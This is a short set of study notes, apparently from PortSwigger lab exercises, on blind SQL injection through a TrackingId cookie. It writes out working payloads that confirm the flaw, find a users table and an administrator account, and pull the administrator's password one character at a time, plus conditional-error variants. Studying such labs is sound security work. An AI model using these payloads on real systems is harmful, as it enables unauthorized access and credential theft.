# Exploiting blind SQL injection by triggering conditional responses
It's important to see the different response that app could send us
1. Identifying vuln
```
TrackingId=xyz' AND '1'='1
TrackingId=xyz' AND '1'='2
```
2. Finding Table
```
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```
3. Finding user
```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```
4. Finding password lenght
```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```
5. Get password
```
TrackingId=xyz' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§
```

# Exploiting blind SQL injection by triggering conditional errors
Something we don't hace  http response so we have to break the sql to see a different behaviour
```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

# Exploiting blind SQL injection using out-of-band (OAST) techniques
[Cheat Sheet Burp](https://portswigger.net/web-security/sql-injection/cheat-sheet)
